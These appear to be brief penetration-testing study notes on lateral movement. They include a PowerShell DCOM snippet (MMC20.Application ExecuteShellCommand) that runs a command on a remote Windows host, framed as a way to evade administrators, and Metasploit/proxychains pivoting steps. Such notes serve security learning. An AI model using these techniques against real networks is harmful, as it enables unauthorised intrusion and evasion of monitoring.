* Remote services are the most prominent for the Lateral movement.
* X window system is remote desktop connection to unix systems where it uses client-server model. it is not encrypted but by using X Forwarding it forwards traffic through ssh tunnel.
* Remote services like telnet,ssh are noticed by the administrators, to evade RPC/DCOM can be used.
* RPc enables the communication between local and remote process on windows,whereas DCOM enables communication between software components over an network.
* Lateral movement with RPC/DCOM:
                                $obj = [activator]::CreateInstance ([type]::GetTypeFromProgID ("MMC20.Application","192.168.1.50")
                                $obj.Document.ActiveView.ExecuteShellCommand ("C:\Windows\system32\calc.exe",$null,$null,"7")
                                
* pivoting using proxychains:
                            After opening a meterprter sesion with the target pivot, add the target subnet to routing table.
                            route add 10.8.0.0 255.255.255.0 1 (1 is the meterprter session)
                            run the Metasploit module auxiliary/server/socks4a to start a proxy server that uses Metasploit's routing table.
                            edit /etc/proxychains.conf to include socks4 127.0.0.1 1080
                            This instructs ProxyChains to use the proxy on localhost
                            lastly using proxychains we can run any command
                            
 * pivoting techniques:
                       port forwarding
                       ssh pivoting
                       vpn pivoting
                       modifying the routing table
